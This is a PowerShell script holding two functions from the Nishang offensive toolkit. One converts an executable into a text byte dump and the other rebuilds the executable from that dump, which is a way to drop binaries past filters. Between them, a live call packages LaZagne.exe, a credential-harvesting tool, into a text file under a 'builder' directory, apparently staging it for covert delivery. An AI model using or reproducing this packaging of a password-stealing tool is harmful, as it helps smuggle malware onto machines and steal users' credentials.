function ExetoText
{
<#
.SYNOPSIS
Nishang script to convert an executable to text file.

.DESCRIPTION
This script converts and an executable to a text file.

.PARAMETER EXE
The path of the executable to be converted.

.PARAMETER FileName
Path of the text file to which executable will be converted.

.EXAMPLE
PS > ExetoText C:\binaries\evil.exe C:\test\evil.txt

.LINK
http://www.exploit-monday.com/2011/09/dropping-executables-with-powershell.html
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $EXE, 
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $Filename = "$pwd\ConvertedText.txt"
    )
    [byte[]] $hexdump = get-content -encoding byte -path "$EXE"
    [System.IO.File]::WriteAllLines($Filename, ([string]$hexdump))
    Write-Output "Converted file written to $Filename"
}

ExetoText C:\Users\Administrateur\Downloads\LaZagne.exe C:\Package\Generator\builder\pn\link\Lazagne.txt

function TexttoEXE
{
<#
.SYNOPSIS
Nishang script to convert a PE file in hex format to executable
.DESCRIPTION
This script converts a PE file in hex to executable and writes it to user temp.
.PARAMETER Filename
Path of the hex text file from which  executable will be created.
.PARAMETER EXE
Path where the executable should be created.
.EXAMPLE
PS > TexttoExe C:\evil.text C:\exe\evil.exe
.LINK
http://www.exploit-monday.com/2011/09/dropping-executables-with-powershell.html
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param ( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $FileName,
    
        [Parameter(Position = 1, Mandatory = $True)]
        [String]$EXE
    )
    
    [String]$hexdump = get-content -path "$Filename"
    [Byte[]] $temp = $hexdump -split ' '
    [System.IO.File]::WriteAllBytes($EXE, $temp)
    Write-Output "Executable written to file $EXE"
}